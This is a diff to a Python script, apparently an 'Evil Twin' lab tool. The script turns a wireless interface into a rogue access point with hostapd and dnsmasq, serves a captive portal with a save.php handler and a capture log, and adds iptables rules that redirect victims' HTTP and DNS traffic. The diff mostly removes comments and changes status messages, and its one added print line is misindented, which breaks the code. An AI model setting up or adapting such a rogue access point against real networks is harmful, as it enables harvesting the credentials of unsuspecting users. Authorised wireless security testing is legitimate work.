@@ -16,10 +16,9 @@ CAPTIVE_INDEX = CAPTIVE_DIR / 'index.html'
 CAPTIVE_SAVE = CAPTIVE_DIR / 'save.php'
 CAPTIVE_LOG  = Path('/var/log/ca.log')
 
-processes = []  # [(name, Popen)]
-iptables_rules = []  # each is a list of args representing a single rule (for -D on cleanup)
+processes = []  
+iptables_rules = [] 
 
-# ----- helpers -----
 
 def run(cmd, check=True, capture=False, quiet=False, env=None):
     """Run a system command. When quiet=True, suppress stdout/stderr unless failing."""
@@ -68,8 +67,6 @@ def ipcalc(network_cidr: str):
     return net, gw_ip, str(dhcp_start), str(dhcp_end)
 
 
-
-
 def ensure_packages():
     pkgs1 = ["apache2","php","libapache2-mod-php"]
     pkgs2 = ["hostapd","dnsmasq","lighttpd","php"]
@@ -92,10 +89,8 @@ def ensure_packages():
     run(["a2enmod","rewrite"], quiet=True)
     run(["a2enmod","headers"], quiet=True)
     run(["systemctl","restart","apache2"], quiet=True)
-    print("[✓] Packages ready.") 
+    print("[+] Packages ready.") 
 
-
-# ----- network config -----
 
 def ensure_iface_exists(iface: str):
     try:
@@ -107,7 +102,6 @@ def ensure_iface_exists(iface: str):
         print(f"[!] '{iface}' looks like a wired interface. For AP mode use a wireless iface (e.g., wlan0/wlp*).")
 
 
-
 def config_iface(iface: str, net, gw_ip: str):
     cidr = net.prefixlen
     run(["ip","link","set",iface,"down"], quiet=True)
@@ -115,8 +109,6 @@ def config_iface(iface: str, net, gw_ip: str):
     run(["ip","addr","add",f"{gw_ip}/{cidr}","dev",iface], quiet=True)
     run(["ip","link","set",iface,"up"], quiet=True)
 
-
-# ----- write configs -----
 
 def write_dnsmasq(iface: str, gw_ip: str, dhcp_start: str, dhcp_end: str):
     ETC_DIR.mkdir(parents=True, exist_ok=True)
@@ -206,10 +198,7 @@ def write_apache_site():
     run(["systemctl","reload","apache2"], quiet=True) 
 
 
-# ----- iptables rules -----
-
 def add_iptables_rules(iface: str):
-    # We'll record rules so we can -D them on cleanup (exact same match order)
     rules = [
         ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","tcp","--dport","80","-j","REDIRECT","--to-ports","80"],
         ["iptables","-t","nat","-A","PREROUTING","-i",iface,"-p","udp","--dport","53","-j","REDIRECT","--to-ports","53"],
@@ -218,6 +207,7 @@ def add_iptables_rules(iface: str):
     for rule in rules:
         run(rule, quiet=True)
     iptables_rules.extend(rules)
+     print("[+] Set Up Iptables")
 
 
 def del_iptables_rules():
@@ -229,9 +219,6 @@ def del_iptables_rules():
             run(delete, check=False, quiet=True)
         except Exception:
             pass
-
-
-# ----- run/cleanup -----
 
 def start_processes():
     # dnsmasq
@@ -274,10 +261,8 @@ def cleanup(iface: str):
         run(["ip","link","set",iface,"up"], check=False)
     except Exception:
         pass
-    print("[✓] Cleanup done.")
+    print("[+] Cleanup done.")
 
-
-# ----- main orchestration -----
 
 def main():
     parser = argparse.ArgumentParser(description="Evil Twin LAB bootstrapper (authorized testing only)")
@@ -316,7 +301,7 @@ def main():
     # 6) iptables
     add_iptables_rules(args.iface)
 
-    # 7) start services (foreground) and handle Ctrl+C
+    
     start_processes()
 
     def handle_sigint(signum, frame):
@@ -328,15 +313,15 @@ def main():
 
     print("[+] Running. Press Ctrl+C to stop and clean up…\n")
 
-    # tail outputs to console to aid troubleshooting
+   
     try:
-        # non-blocking tail of both processes
+        
         while True:
             alive = False
             for name, proc in processes:
                 if proc.poll() is None:
                     alive = True
-                    # drain available lines
+                    
                     try:
                         if proc.stdout and not proc.stdout.closed:
                             while True:
